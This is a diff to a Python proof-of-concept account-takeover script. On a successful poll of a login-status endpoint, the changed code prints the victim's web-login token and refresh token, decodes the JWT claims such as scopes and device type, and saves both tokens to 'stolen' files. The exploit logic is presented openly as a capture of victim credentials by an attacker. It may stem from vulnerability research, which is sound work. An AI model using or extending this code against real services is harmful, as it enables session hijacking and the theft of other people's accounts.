@@ -130,13 +130,21 @@ def main():
                 print(f"[{t}] status = {status}")
             last = status
         if status == "SUCCESS":
-            tok = data.get("token")
-            print(f"\n[ATO] username = {data.get('username')}  webIdentifier = {data.get('webIdentifier')}")
-            print(f"[ATO] token  = {tok}")
-            print(f"[ATO] claims = {json.dumps(decode_jwt(tok))}")
-            open("stolen_token.txt", "w").write(tok or "")
-            print("[ATO] saved -> stolen_token.txt")
-            banner("POC COMPLETE — the victim account token is in the attacker's channel")
+            tok = data.get("token") or ""
+            ref = data.get("refreshToken") or ""
+            print(f"\n[ATO] poll SUCCESS  username={data.get('username')}  webIdentifier={data.get('webIdentifier')}")
+            print(f"[ATO] token issued ({len(tok)} chars):")
+            for i in range(0, len(tok), 68):
+                print("[ATO]   " + tok[i:i + 68])
+            print(f"[ATO] refreshToken issued ({len(ref)} chars):")
+            for i in range(0, len(ref), 68):
+                print("[ATO]   " + ref[i:i + 68])
+            cl = decode_jwt(tok)
+            print(f"[ATO] claims: username={cl.get('username')} iss={cl.get('iss')} deviceType={cl.get('deviceType')} scopes={cl.get('scopes')}")
+            open("stolen_token.txt", "w").write(tok)
+            open("stolen_refresh.txt", "w").write(ref)
+            print("[ATO] saved -> stolen_token.txt / stolen_refresh.txt")
+            banner("POC COMPLETE — victim web-login token + refreshToken captured by the attacker")
             return
         # light backoff to dodge testapi rate-limits (status persists server-side, nothing lost)
         time.sleep(4)
